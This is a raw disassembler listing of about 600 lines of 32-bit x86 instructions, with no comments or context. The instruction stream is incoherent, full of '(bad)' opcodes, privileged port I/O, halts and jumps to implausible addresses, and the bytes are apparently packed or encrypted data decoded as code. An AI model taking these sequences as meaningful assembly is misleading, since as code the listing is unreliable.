  415f37:	mov    dh,0xeb
  415f39:	popf   
  415f3a:	dec    edx
  415f3b:	mov    ecx,0xcebc7941
  415f40:	int3   
  415f41:	imul   bp,WORD PTR [edi],0xffde
  415f45:	(bad)  
  415f46:	dec    edx
  415f47:	sub    eax,0xc486f47d
  415f4c:	and    DWORD PTR [edx-0x7a266948],eax
  415f52:	rcr    BYTE PTR [ebp-0xcdf1d33],1
  415f58:	or     edi,DWORD PTR [ebx]
  415f5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f5b:	pop    esi
  415f5c:	xor    ecx,DWORD PTR [ebp+esi*4+0x3f]
  415f60:	sahf   
  415f61:	sbb    eax,DWORD PTR [edi-0x787ce28b]
  415f67:	mov    al,0x73
  415f69:	mov    ds:0x7616eabf,al
  415f6e:	mov    eax,ds:0x44ddbaef
  415f73:	out    dx,al
  415f74:	popa   
  415f75:	jp     0x415f31
  415f77:	in     al,0x27
  415f79:	cmc    
  415f7a:	jb     0x415f65
  415f7c:	std    
  415f7d:	adc    edi,ecx
  415f7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f80:	inc    edi
  415f81:	shl    BYTE PTR [ebp+0x99536cc],1
  415f87:	mov    ?,WORD PTR [ebp-0x4aa0f379]
  415f8d:	dec    edi
  415f8e:	inc    ebx
  415f8f:	pusha  
  415f90:	mov    esi,0xb1bcd364
  415f95:	fprem  
  415f97:	add    eax,0xa11ffa47
  415f9c:	stos   BYTE PTR es:[edi],al
  415f9d:	mov    ds:0xe17040fe,eax
  415fa2:	or     BYTE PTR [eax-0x16],al
  415fa5:	out    dx,al
  415fa6:	dec    ebp
  415fa7:	pop    ebx
  415fa8:	jb     0x415fe2
  415faa:	call   0x8113863c
  415faf:	hlt    
  415fb0:	xchg   edi,eax
  415fb1:	sar    DWORD PTR [eax+0x7ef1c0da],0xad
  415fb8:	(bad)  
  415fb9:	push   edi
  415fba:	mov    dh,0x62
  415fbc:	inc    eax
  415fbd:	add    eax,0x65585fec
  415fc2:	add    DWORD PTR [ebx],esp
  415fc4:	pop    ebp
  415fc5:	mov    ebx,0xad3c820
  415fca:	cmc    
  415fcb:	and    BYTE PTR [esi-0xe],dl
  415fce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fcf:	cmp    ecx,DWORD PTR [edi-0x33]
  415fd2:	fstp   DWORD PTR [ebp+0x3ec9e5e2]
  415fd8:	cmp    DWORD PTR ds:0x5c4e639d,edi
  415fde:	adc    al,0xd
  415fe0:	mov    bh,BYTE PTR [eax]
  415fe2:	imul   esp,DWORD PTR cs:[esp+edi*2-0x64],0x65bdf18
  415feb:	scas   eax,DWORD PTR es:[edi]
  415fec:	scas   eax,DWORD PTR es:[edi]
  415fed:	cmp    bl,BYTE PTR [eax+0x79]
  415ff0:	test   eax,0x9cbfedae
  415ff5:	ins    BYTE PTR es:[edi],dx
  415ff6:	je     0x415f87
  415ff8:	xor    DWORD PTR [ecx],esi
  415ffa:	xor    eax,0xe18a5dc3
  415fff:	gs xor cl,cl
  416002:	je     0x415fce
  416004:	push   esp
  416005:	scas   eax,DWORD PTR es:[edi]
  416006:	inc    edx
  416007:	mov    ch,0xdb
  416009:	xor    ebp,ebx
  41600b:	inc    esi
  41600c:	js     0x415fd2
  41600e:	adc    ebx,ebx
  416010:	loop   0x415fd5
  416012:	xchg   DWORD PTR [esi-0x641b0179],ecx
  416018:	mov    al,ds:0x29189c71
  41601d:	xchg   BYTE PTR [ecx-0x40],bl
  416020:	hlt    
  416021:	mov    ch,0xb6
  416023:	xor    DWORD PTR [eax-0x67],esp
  416026:	ret    
  416027:	mov    bl,0xed
  416029:	jge    0x416055
  41602b:	das    
  41602c:	pop    ecx
  41602d:	mov    al,ds:0xe21f9457
  416032:	in     eax,dx
  416033:	pop    ebx
  416034:	adc    bl,BYTE PTR [edi]
  416036:	or     al,0x75
  416038:	rcr    DWORD PTR [ebp+0x22],1
  41603b:	fwait
  41603c:	cwde   
  41603d:	sbb    BYTE PTR [edi],cl
  41603f:	or     DWORD PTR [ecx-0x33],esp
  416042:	xor    DWORD PTR ds:0xa757c0a7,esi
  416048:	loop   0x416089
  41604a:	ret    
  41604b:	pop    eax
  41604c:	jnp    0x41602f
  41604e:	out    0x51,al
  416050:	ret    0x2723
  416053:	push   eax
  416054:	icebp  
  416055:	jmp    0x797e:0x46679fb6
  41605c:	or     BYTE PTR [ecx+edx*2+0x36],ah
  416060:	int    0x15
  416062:	retf   0xbe20
  416065:	stos   BYTE PTR es:[edi],al
  416066:	mov    cl,0x92
  416068:	out    0x91,al
  41606a:	enter  0xa219,0xc2
  41606e:	adc    DWORD PTR [ebp+esi*4-0x60],ecx
  416072:	xchg   BYTE PTR [ebx],cl
  416074:	lods   eax,DWORD PTR ds:[esi]
  416075:	xchg   edi,eax
  416076:	xor    ah,0x7a
  416079:	ss inc eax
  41607b:	pop    es
  41607c:	int    0xb3
  41607e:	sub    eax,0x934d0678
  416083:	inc    ebx
  416084:	icebp  
  416085:	jbe    0x416018
  416087:	dec    edi
  416088:	adc    DWORD PTR [ebx*2+0x7368a64f],edx
  41608f:	arpl   WORD PTR [ebx],cx
  416091:	popa   
  416092:	fistp  WORD PTR [ebx+0x24]
  416095:	mov    esi,0x94ec24dd
  41609a:	jmp    0xc4bbaad9
  41609f:	sub    eax,0x47f85877
  4160a4:	in     eax,dx
  4160a5:	stos   DWORD PTR es:[edi],eax
  4160a6:	rol    DWORD PTR [esi+0x12],1
  4160a9:	loope  0x4160f0
  4160ab:	aam    0xb1
  4160ad:	outs   dx,DWORD PTR ds:[esi]
  4160ae:	dec    edi
  4160af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160b0:	push   edi
  4160b1:	pop    esp
  4160b2:	or     ebx,eax
  4160b4:	call   0xb57c:0xb4893885
  4160bb:	aad    0xab
  4160bd:	inc    eax
  4160be:	out    0x91,eax
  4160c0:	and    al,0x8a
  4160c2:	push   edi
  4160c3:	popa   
  4160c4:	mov    bh,0xc7
  4160c6:	sar    BYTE PTR [ebx-0x20c9128c],1
  4160cc:	jmp    0x41610b
  4160ce:	dec    esi
  4160cf:	adc    al,0xc
  4160d1:	jo     0xa025295c
  4160d7:	shr    BYTE PTR [ebx-0x44b520d8],0xa4
  4160de:	adc    al,0x1a
  4160e0:	jmp    0x416101
  4160e2:	ins    BYTE PTR es:[edi],dx
  4160e3:	xor    BYTE PTR [ebp-0x7db31b2],bh
  4160e9:	fnstenv [ebx+0x166cc707]
  4160ef:	sub    al,0x3c
  4160f1:	sub    esp,DWORD PTR [edi+0x49650a60]
  4160f7:	or     eax,0x3909b173
  4160fc:	inc    ebx
  4160fd:	sub    edx,DWORD PTR [eax-0x64]
  416100:	pusha  
  416101:	std    
  416102:	daa    
  416103:	inc    ebp
  416104:	shl    DWORD PTR [ecx],1
  416106:	fst    QWORD PTR [ecx+0xa]
  416109:	cdq    
  41610a:	es xchg edx,eax
  41610c:	jno    0x4160fb
  41610e:	pusha  
  41610f:	adc    eax,0xc10eb522
  416114:	pop    ebp
  416115:	push   ebp
  416116:	mov    ch,0xbb
  416118:	mov    fs,WORD PTR [edx-0xd900680]
  41611e:	ficomp WORD PTR ds:0xdf7ae037
  416124:	adc    ah,bl
  416126:	sub    BYTE PTR [ecx-0x2a],ch
  416129:	loop   0x41611c
  41612b:	push   es
  41612c:	sub    al,0x2f
  41612e:	daa    
  41612f:	out    0x81,al
  416131:	xchg   ebp,eax
  416132:	int3   
  416133:	fstp   QWORD PTR [edi+edi*4]
  416136:	repnz xchg esi,eax
  416138:	jo     0x41613a
  41613a:	adc    DWORD PTR [edi+ebp*4-0x25],ebx
  41613e:	inc    edi
  41613f:	inc    ecx
  416140:	inc    esi
  416141:	dec    esi
  416142:	imul   ebx,DWORD PTR [ecx-0x5f755f19],0xdd5edbaf
  41614c:	sbb    ebp,DWORD PTR [ecx-0x10]
  41614f:	adc    BYTE PTR [ebx],dl
  416151:	xchg   edx,eax
  416152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416153:	shr    BYTE PTR ds:0x6e76aaa1,0x14
  41615a:	mov    eax,0xb9a41fa4
  41615f:	jb     0x41619e
  416161:	(bad)  
  416162:	mov    edx,DWORD PTR [ebx-0x358c0816]
  416168:	mov    ch,0x2d
  41616a:	mov    ds:0x24349b79,eax
  41616f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416170:	mov    esp,0x47aa4502
  416175:	(bad)  
  416176:	lods   al,BYTE PTR ds:[esi]
  416177:	xchg   BYTE PTR [esi],dh
  416179:	int    0xc8
  41617b:	or     al,0x2b
  41617d:	sub    DWORD PTR [esi-0xf],0x72f9920a
  416184:	adc    BYTE PTR [edx+0x2c],cl
  416187:	add    dl,BYTE PTR [esi]
  416189:	or     BYTE PTR [ecx],cl
  41618b:	jge    0x41613a
  41618d:	pop    esp
  41618e:	cmp    eax,0xf94b83c9
  416193:	sub    DWORD PTR [ebx],ebx
  416195:	imul   eax,DWORD PTR [ecx],0xffffffe8
  416198:	or     al,0xda
  41619a:	mov    bl,0x4f
  41619c:	(bad)  
  41619d:	push   eax
  41619e:	push   ds
  41619f:	sbb    DWORD PTR [edx+0xdcf7c9f],esp
  4161a5:	cdq    
  4161a6:	cs (bad) 
  4161a8:	mov    ds,WORD PTR [ebx-0x45802db2]
  4161ae:	sahf   
  4161af:	adc    ebx,DWORD PTR [ecx]
  4161b1:	mov    ch,0x38
  4161b3:	push   edx
  4161b4:	pop    esi
  4161b5:	cdq    
  4161b6:	add    esi,DWORD PTR [eax-0x46]
  4161b9:	loope  0x416192
  4161bb:	mov    esp,0x4bb921d4
  4161c0:	aam    0xf8
  4161c2:	into   
  4161c3:	mov    ds:0x9f78ccc,al
  4161c8:	xor    DWORD PTR [eax+0x2c],edi
  4161cb:	xor    ecx,DWORD PTR [esi]
  4161cd:	xchg   edx,eax
  4161ce:	popf   
  4161cf:	out    dx,eax
  4161d0:	pop    es
  4161d1:	outs   dx,DWORD PTR ds:[esi]
  4161d2:	imul   BYTE PTR [esi]
  4161d4:	jl     0x41616f
  4161d6:	stos   BYTE PTR es:[edi],al
  4161d7:	aas    
  4161d8:	(bad)  
  4161d9:	(bad)  
  4161da:	cld    
  4161db:	inc    edx
  4161dc:	sbb    BYTE PTR [ebx+edi*1+0x5],dh
  4161e0:	jns    0x4161eb
  4161e2:	ret    0x12f8
  4161e5:	add    al,0x58
  4161e7:	enter  0xe316,0x11
  4161eb:	push   esp
  4161ec:	lahf   
  4161ed:	iret   
  4161ee:	loop   0x4161d0
  4161f0:	mov    edi,0x94275e82
  4161f5:	outs   dx,DWORD PTR ds:[esi]
  4161f6:	rcl    BYTE PTR [edi],1
  4161f8:	add    edi,DWORD PTR [eax+0x458acdcc]
  4161fe:	xor    esi,edi
  416200:	cwde   
  416201:	jo     0x41625d
  416203:	adc    eax,0x3cb80ad2
  416208:	fnstenv [edi]
  41620a:	jmp    0x347e1544
  41620f:	mov    ebx,0xd61d122a
  416214:	in     al,dx
  416215:	push   ds
  416216:	pop    eax
  416217:	jle    0x416289
  416219:	stos   BYTE PTR es:[edi],al
  41621a:	push   cs
  41621b:	idiv   BYTE PTR gs:[edi]
  41621e:	xchg   ebx,eax
  41621f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416220:	adc    esp,esi
  416222:	in     al,dx
  416223:	add    BYTE PTR [ebx+0x44f1bda8],bl
  416229:	out    0xcf,eax
  41622b:	cwde   
  41622c:	xor    DWORD PTR [eax],0x36
  41622f:	jnp    0x416235
  416231:	imul   ebx,DWORD PTR [edi+0x25],0xffffff8b
  416235:	loope  0x416244
  416237:	nop
  416238:	outs   dx,DWORD PTR ds:[esi]
  416239:	sbb    BYTE PTR [edx-0x7b05c564],dl
  41623f:	dec    ebx
  416240:	arpl   WORD PTR [ebp+0xec5743],sp
  416246:	gs test eax,0xb026d97d
  41624c:	push   0xaddbd4fd
  416251:	cmp    ch,BYTE PTR [ebp+0x7f8a6709]
  416257:	dec    esp
  416258:	sti    
  416259:	cmp    DWORD PTR [ebx+esi*2+0x5b],eax
  41625d:	xchg   ebp,eax
  41625e:	xor    ch,BYTE PTR [edx+0x12d9fd0f]
  416264:	int3   
  416265:	lods   al,BYTE PTR ds:[esi]
  416266:	mov    ds:0x1acc659d,eax
  41626b:	xor    DWORD PTR [ebp+0x44],ebp
  41626e:	ror    BYTE PTR [eax],0xb
  416271:	outs   dx,BYTE PTR ds:[esi]
  416272:	add    bh,BYTE PTR [ecx]
  416274:	jb     0x4162ed
  416276:	ret    0xbbf0
  416279:	stos   DWORD PTR es:[edi],eax
  41627a:	and    eax,0xf58b213c
  41627f:	sbb    eax,0x8d3226f5
  416284:	adc    ecx,DWORD PTR [eax]
  416286:	sti    
  416287:	pop    edx
  416288:	mov    dh,0xe
  41628a:	jle    0x416235
  41628c:	aaa    
  41628d:	or     DWORD PTR [ebp-0x5c],ebx
  416290:	mov    ah,0x28
  416292:	pushf  
  416293:	iret   
  416294:	inc    esi
  416295:	call   0x7582327
  41629a:	and    BYTE PTR [edx-0x29087549],0xa
  4162a1:	test   BYTE PTR [ecx-0x66179ae5],al
  4162a7:	push   es
  4162a8:	sbb    al,0x42
  4162aa:	ja     0x416266
  4162ac:	and    eax,0x1377f243
  4162b1:	mov    ch,0x80
  4162b3:	mov    esi,0x82022d94
  4162b8:	jnp    0x416296
  4162ba:	cmp    DWORD PTR [ecx+0x35367b29],ecx
  4162c0:	les    eax,FWORD PTR [ebp-0x48]
  4162c3:	inc    ebp
  4162c4:	add    ch,0x4c
  4162c7:	sub    BYTE PTR [ecx],0x2b
  4162ca:	arpl   WORD PTR [ecx],ax
  4162cc:	nop
  4162cd:	adc    edi,esi
  4162cf:	nop
  4162d0:	mov    ds:0x359fc881,eax
  4162d5:	aas    
  4162d6:	rcl    BYTE PTR [esi],cl
  4162d8:	push   ecx
  4162d9:	in     al,dx
  4162da:	mov    ecx,0x1f0f9611
  4162df:	mov    ds:0xaf34caad,eax
  4162e4:	push   esi
  4162e5:	mov    al,0xc
  4162e7:	push   eax
  4162e8:	test   bh,ch
  4162ea:	jg     0x4162f9
  4162ec:	and    ecx,DWORD PTR [eax]
  4162ee:	jle    0x416347
  4162f0:	push   ebp
  4162f1:	mov    bl,0x51
  4162f3:	or     bh,ch
  4162f5:	jae    0x416291
  4162f7:	pop    ss
  4162f8:	push   esp
  4162f9:	lods   eax,DWORD PTR ds:[esi]
  4162fa:	(bad)  
  4162fb:	loop   0x4162ad
  4162fd:	out    0x4e,al
  4162ff:	ja     0x41636d
  416301:	fidiv  WORD PTR [esi-0x61]
  416304:	lods   eax,DWORD PTR ds:[esi]
  416305:	pop    edx
  416306:	addr16 je 0x416315
  416309:	stc    
  41630a:	pop    eax
  41630b:	lock ss push ds
  41630e:	xchg   BYTE PTR gs:[eax-0x64],dl
  416312:	les    edx,FWORD PTR [ecx]
  416314:	int    0x0
  416316:	int    0x2e
  416318:	jl     0x416378
  41631a:	or     BYTE PTR [edi+0x1080194d],0x24
  416321:	loopne 0x41635f
  416323:	jne    0x4162c0
  416325:	adc    ah,BYTE PTR [ebx+edi*4-0x24de964b]
  41632c:	mov    eax,0x342c41d3
  416331:	lods   eax,DWORD PTR ds:[esi]
  416332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416333:	test   DWORD PTR [eax],ecx
  416335:	dec    edx
  416336:	jecxz  0x4162b8
  416338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416339:	sub    BYTE PTR [eax+0x1a536e69],0xa1
  416340:	pushw  0x7b
  416343:	adc    eax,0xfc89db23
  416348:	and    BYTE PTR [ebx-0x4eff5321],cl
  41634e:	xor    al,BYTE PTR [edi+0x28320af4]
  416354:	lds    ebx,FWORD PTR [bx+di-0x76]
  416358:	or     ebp,DWORD PTR [eax+0x62]
  41635b:	mov    ch,0x5b
  41635d:	dec    edx
  41635e:	sbb    bh,BYTE PTR [eax+0x387150f8]
  416364:	lds    esi,FWORD PTR [edi]
  416366:	jle    0x4162fb
  416368:	stos   DWORD PTR es:[edi],eax
  416369:	(bad)
  41636c:	xchg   esi,eax
  41636d:	ret    
  41636e:	repz sub ecx,DWORD PTR [ebp+ebx*1+0x6c36b4d1]
  416376:	pusha  
  416377:	repnz rcl DWORD PTR [ecx],0xba
  41637b:	fisub  DWORD PTR [ebx+edx*8]
  41637e:	ret    
  41637f:	cmp    BYTE PTR [edi+ebp*4+0x720483d7],ah
  416386:	sar    BYTE PTR [ebx+0x2d],1
  416389:	pop    es
  41638a:	xor    ch,BYTE PTR [esp+ecx*8+0x7138e1d6]
  416391:	aam    0x33
  416393:	pop    ds
  416394:	mov    esp,0x154b8ba3
  416399:	addr16 aaa 
  41639b:	js     0x416404
  41639d:	test   al,0x87
  41639f:	sbb    BYTE PTR [esi+0x6f8fc704],0x45
  4163a6:	cli    
  4163a7:	ja     0x41632c
  4163a9:	mov    edi,0x464c459c
  4163ae:	cld    
  4163af:	mov    BYTE PTR [eax+0x60],ch
  4163b2:	mov    dl,0x39
  4163b4:	lock adc DWORD PTR [edx+0x1e],ebx
  4163b8:	in     al,dx
  4163b9:	mov    ah,0x98
  4163bb:	ds jbe 0x4163c7
  4163be:	out    0x9c,al
  4163c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163c1:	into   
  4163c2:	loope  0x4163c4
  4163c4:	fwait
  4163c5:	xchg   edi,eax
  4163c6:	sbb    edi,esi
  4163c8:	and    dl,BYTE PTR [eax]
  4163ca:	ja     0x41636d
  4163cc:	mov    esp,0x4b980824
  4163d1:	xor    edx,ebp
  4163d3:	test   edi,edi
  4163d5:	hlt    
  4163d6:	jp     0x416371
  4163d8:	idiv   DWORD PTR [edi]
  4163da:	ins    BYTE PTR es:[edi],dx
  4163db:	adc    BYTE PTR [ebp-0x1777d926],0x5a
  4163e2:	rcr    bl,1
  4163e4:	adc    DWORD PTR [ebp+0xb184d7e],ebp
  4163ea:	push   edi
  4163eb:	mov    dl,0xc
  4163ed:	push   esi
  4163ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163ef:	loope  0x4163c5
  4163f1:	jl     0x41640c
  4163f3:	mov    al,ds:0x4de95c2b
  4163f8:	mov    ds:0xc5a2c39b,al
  4163fd:	xchg   edi,eax
  4163fe:	xor    BYTE PTR [esi+0x4b9c14b4],bh
  416404:	add    dl,BYTE PTR [ecx-0x2e]
  416407:	ds dec eax
  416409:	jge    0x4163b1
  41640b:	add    cl,BYTE PTR [ecx+0xd]
  41640e:	clc    
  41640f:	inc    edx
  416410:	clc    
  416411:	scas   al,BYTE PTR es:[edi]
  416412:	int    0x59
  416414:	xor    al,0xf0
  416416:	push   ss
  416417:	mov    esp,0x8312fa25
  41641c:	popf   
  41641d:	or     BYTE PTR [ebx-0x3514b819],al
  416423:	mov    eax,DWORD PTR [eax+0x361d5801]
  416429:	pushf  
  41642a:	jmp    0x416421
  41642c:	dec    esi
  41642d:	push   edi
  41642e:	push   edi
  41642f:	loopne 0x41640b
  416431:	imul   ebx,DWORD PTR [esi+eax*2-0x3b1ddea8],0xcd81a0b7
  41643c:	cli    
  41643d:	pminsw mm1,QWORD PTR ds:0xe4482d35
  416444:	mov    cl,BYTE PTR [eax+0x2c]
  416447:	hlt    
  416448:	rcl    DWORD PTR [edx+eax*4+0x1c33d9bc],0x9f
  416450:	dec    esp
  416451:	hlt    
  416452:	in     al,dx
  416453:	jae    0x4163fb
  416455:	or     BYTE PTR [edi],cl
  416457:	add    DWORD PTR [ebp-0x54],ecx
  41645a:	test   DWORD PTR [ecx-0x7f],ecx
  41645d:	adc    BYTE PTR [ebx+0x527456d4],0x8a
  416464:	push   eax
  416465:	mov    edx,0xe551c6ce
  41646a:	inc    BYTE PTR [edi]
  41646c:	pop    esp
  41646d:	icebp  
  41646e:	adc    edx,DWORD PTR [ecx+0x4425b475]
  416474:	sbb    eax,0xe0798140
  416479:	lahf   
  41647a:	jne    0x416407
  41647c:	fist   DWORD PTR [ebx+esi*1]
  41647f:	jge    0x41641c
  416481:	test   esi,eax
  416483:	dec    esp
  416484:	pushf  
  416485:	mov    ecx,0xedefcce9
  41648a:	js     0x4164f5
  41648c:	and    BYTE PTR [eax-0x47],0xbe
  416490:	mov    cl,0xaf
  416492:	jg     0x41647e
  416494:	pop    edx
  416495:	rcr    cl,1
  416497:	test   DWORD PTR [edi+esi*4-0x18],0x971066ab
  41649f:	push   es
  4164a0:	add    al,BYTE PTR [eax+0x65d61deb]
  4164a6:	mov    WORD PTR [edi+0x78071679],ds
  4164ac:	mov    ?,WORD PTR [ebx]
  4164ae:	cmp    BYTE PTR [ebx],dl
  4164b0:	sbb    ch,0x24
  4164b3:	ret    
  4164b4:	stos   BYTE PTR es:[edi],al
  4164b5:	into   
  4164b6:	lock sbb ch,BYTE PTR es:[edx]
  4164ba:	cmp    eax,0xf987390e
  4164bf:	arpl   WORD PTR [ebp+0x2706415f],sp
  4164c5:	mov    eax,ds:0xe6cd764b
  4164ca:	rcr    esp,0xa2
  4164cd:	fild   QWORD PTR [esp+ebp*1-0x1f]
  4164d1:	jecxz  0x416515
  4164d3:	add    al,0x60
  4164d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164d6:	mov    ecx,0x7010b41b
  4164db:	cmp    DWORD PTR fs:[eax],ebx
  4164de:	sub    edx,0x84b64719
  4164e4:	shl    DWORD PTR [ebp+0x1139b49],1
  4164ea:	std    
  4164eb:	xchg   ecx,eax
  4164ec:	arpl   WORD PTR [edi],bp
  4164ee:	pop    ecx
  4164ef:	mov    ds:0x83d7df0c,eax
  4164f4:	pop    ss
  4164f5:	xchg   DWORD PTR [eax+0xc],ecx
  4164f8:	cmp    dl,BYTE PTR [edx-0x1]
  4164fb:	cdq    
  4164fc:	xchg   edi,eax
  4164fd:	xchg   DWORD PTR [ebx+0x32],esi
  416500:	mov    DWORD PTR [esp+esi*2],ecx
  416503:	push   0xd3085c25
  416508:	inc    ebx
  416509:	and    eax,0xdb6aba5d
  41650e:	push   0xe
  416510:	sub    cl,bl
  416512:	xchg   BYTE PTR [ebx+0x60],dl
  416515:	pusha  
  416516:	std    
  416517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416518:	push   edx
  416519:	pop    ebp
  41651a:	cwde   
  41651b:	mov    al,ds:0xb7dec866
  416520:	inc    eax
  416521:	xor    eax,0xadcbca74
  416526:	sub    dl,BYTE PTR [ecx+0x79]
  416529:	jb     0x4164b1
  41652b:	dec    edx
  41652c:	xchg   DWORD PTR [eax+0x30a66f0d],esi
  416532:	pop    edi
  416533:	bound  edi,QWORD PTR [edi]
  416535:	xor    al,0x2c
  416537:	or     al,ch
  416539:	mov    al,0x75
  41653b:	cmp    eax,edx
  41653d:	sbb    eax,0x7abc709e
  416542:	sub    ch,bl
  416544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416545:	gs pop edx
  416547:	and    al,0xaf
  416549:	icebp  
  41654a:	std    
  41654b:	add    dl,BYTE PTR [eax-0x43]
  41654e:	add    eax,0x96e7f8d3
  416553:	jne    0x416587
  416555:	cmp    al,0x78
  416557:	mov    ebx,0xbfc66215
  41655c:	adc    DWORD PTR ds:0x38c6172a,0xffffffad
  416563:	xchg   ecx,eax
  416564:	daa    
  416565:	xchg   esp,eax
  416566:	pop    ss
  416567:	inc    ecx
  416568:	sub    BYTE PTR [edx-0x57],bh
  41656b:	fdivr  DWORD PTR [edi-0x4541e9b0]
  416571:	ret    0x80ec
  416574:	ret    
  416575:	mov    ebx,0xffc60032
  41657a:	adc    edi,DWORD PTR [edi]
  41657c:	fdivr  DWORD PTR ds:[ebx]
  41657f:	inc    eax
  416580:	enter  0x8faa,0xfb
  416584:	mov    eax,ds:0x79d35020
  416589:	xchg   DWORD PTR [eax],esi
  41658b:	ret    
  41658c:	shl    DWORD PTR [bp+0x64],1
  416590:	or     DWORD PTR [ebp-0x1a],eax
  416593:	xchg   ecx,eax
  416594:	lahf   
  416595:	jge    0x4165ad
  416597:	xchg   edi,eax
  416598:	xor    DWORD PTR [ecx-0x24],0xccc58a84
  41659f:	sub    al,0x69
  4165a1:	lods   eax,DWORD PTR ds:[esi]
  4165a2:	sahf   
  4165a3:	mov    esi,0x33f22967
  4165a8:	pop    eax
  4165a9:	or     edi,edi
  4165ab:	mov    eax,ds:0x25113fb6
  4165b0:	or     al,0x24
  4165b2:	jnp    0x416619
  4165b4:	sti    
  4165b5:	out    0x9b,eax
  4165b7:	xchg   edx,eax
  4165b8:	xlat   BYTE PTR ds:[ebx]
  4165b9:	pop    ebx
  4165ba:	xchg   edx,eax
  4165bb:	out    0x98,eax
  4165bd:	stos   DWORD PTR es:[edi],eax
  4165be:	ret    
  4165bf:	ret    0xc29e
  4165c2:	mov    dl,0xda
  4165c4:	in     al,dx
  4165c5:	cld    
  4165c6:	jno    0x4165d4
  4165c8:	dec    eax
  4165c9:	cmp    BYTE PTR [eax+0x72],0xd6
  4165cd:	xor    esp,DWORD PTR [esi+edi*4+0x4ee0e76d]
  4165d4:	cmp    DWORD PTR [edi],edi
  4165d6:	and    BYTE PTR [eax],dh
  4165d8:	sub    cl,cl
  4165da:	shl    bl,1
  4165dc:	push   0x616733a0
  4165e1:	mov    ah,0xc
  4165e3:	inc    edx
  4165e4:	jb     0x4165c4
  4165e6:	out    dx,eax
  4165e7:	repz jmp 0x427ba2c0
  4165ed:	repnz mov dl,0x1c
  4165f0:	scas   eax,DWORD PTR es:[edi]
  4165f1:	cwde   
  4165f2:	jnp    0x416617
  4165f4:	call   0x7b5650ee
  4165f9:	jecxz  0x416601
  4165fb:	mov    DWORD PTR [ecx+0x4d],edx
  4165fe:	cdq    
  4165ff:	push   edi
  416600:	or     bl,bh
  416602:	jmp    0x5c6961b5
  416607:	push   edi
  416608:	lods   al,BYTE PTR ds:[esi]
  416609:	mov    ds:0x29a9cb51,al
  41660e:	repz mov dl,0x9d
  416611:	inc    ebx
  416612:	add    al,0x46
  416614:	out    0x75,al
  416616:	sti    
  416617:	mov    BYTE PTR [eax+0x64],0x84
  41661b:	repz mov ecx,0x8f3f6acb
  416621:	push   es
  416622:	mov    esi,0x45c9ddd2
  416627:	call   0x3cc2:0x6f0d242
  41662e:	and    edi,DWORD PTR [ebx]
  416630:	rcl    ch,0xc7
  416633:	xor    eax,0xf4a8f525
  416638:	leave  
  416639:	jne    0x41664c
  41663b:	frstor [ebp+0x34cd550d]
  416641:	arpl   WORD PTR [ebx],sp
  416643:	fstp   DWORD PTR fs:[esp-0xb85dfb5]
  41664b:	sahf   
  41664c:	loope  0x41665d
  41664e:	jle    0x416615
  416650:	shl    BYTE PTR [ebx-0x31],0x1d
  416654:	xor    ebp,DWORD PTR [edx+0x6de5d6c3]
  41665a:	cmp    ecx,ebx
  41665c:	test   DWORD PTR [ebx+0x31],ecx
  41665f:	push   eax
  416660:	sbb    BYTE PTR [esi],0x25
  416663:	aas    
  416664:	ret    
  416665:	test   al,0xd5
  416667:	mov    esi,0x50b5e734
  41666c:	sbb    DWORD PTR [ebp+0x24],0x625f192d
  416673:	dec    ecx
  416674:	xchg   esi,eax
  416675:	xor    dl,BYTE PTR [ebp+0x5d7524b]
  41667b:	nop
  41667c:	aam    0x17
  41667e:	push   edi
  41667f:	inc    ebp
  416680:	(bad)  
  416681:	cmc    
  416682:	data16 mov ss,WORD PTR [edi+0x72]
  416686:	xchg   esp,eax
  416687:	adc    al,0xa6
  416689:	aam    0x84
  41668b:	retf   0xa4c3
  41668e:	pop    esp
  41668f:	enter  0xb33c,0x6a
  416693:	enter  0xf233,0xd5
  416697:	jl     0x4166d9
  416699:	jge    0x416711
  41669b:	add    edi,0xb2bac000
  4166a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166a2:	pop    es
  4166a3:	xchg   BYTE PTR [ecx+0x6d15090b],cl
  4166a9:	fsub   st(6),st
  4166ab:	sub    al,ch
  4166ad:	inc    eax
  4166ae:	add    esp,0x91229134
  4166b4:	repnz stos BYTE PTR es:[edi],al
  4166b6:	ds xchg ecx,eax
  4166b8:	(bad)  
  4166ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166bb:	adc    dl,bh
  4166bd:	leave  
  4166be:	adc    ecx,ebx
  4166c0:	fist   DWORD PTR [ebx+0x5c]
  4166c3:	in     eax,dx
  4166c4:	neg    BYTE PTR [esp+eiz*8]
  4166c7:	dec    edi
  4166c8:	leave  
  4166c9:	psubd  mm2,QWORD PTR [eax+0x1657be5b]
  4166d0:	shl    BYTE PTR [ebx],1
  4166d2:	mov    ch,0xf8
  4166d4:	ja     0x4166c2
  4166d6:	add    ecx,DWORD PTR [edx+0x16]
  4166d9:	mov    eax,cs:0x5fdcb2be
  4166df:	kxorb  k3,k3,k4
  4166e3:	jae    0x41673d
  4166e5:	addr16 push ebp
  4166e7:	cmp    al,0x37
  4166e9:	(bad)  [ebx+0x2c]
  4166ec:	mov    edx,0xd601198e
  4166f1:	sbb    ebp,DWORD PTR [edi]
  4166f3:	push   0xffffffd0
  4166f5:	xor    eax,DWORD PTR [ebp-0x2d]
  4166f8:	out    dx,eax
  4166f9:	jbe    0x4166ff
  4166fb:	inc    ebp
  4166fc:	or     ch,BYTE PTR [esi+0x4]
  4166ff:	mov    BYTE PTR [edi],ch
  416701:	in     eax,dx
  416702:	or     eax,0x45a2ffb1
  416707:	push   eax
  416708:	sub    dl,bl
  41670a:	(bad)  
  41670b:	cmp    DWORD PTR [esi+0x5b],eax
  41670e:	adc    al,0xe1
  416710:	fmul   DWORD PTR [edi+0x23]
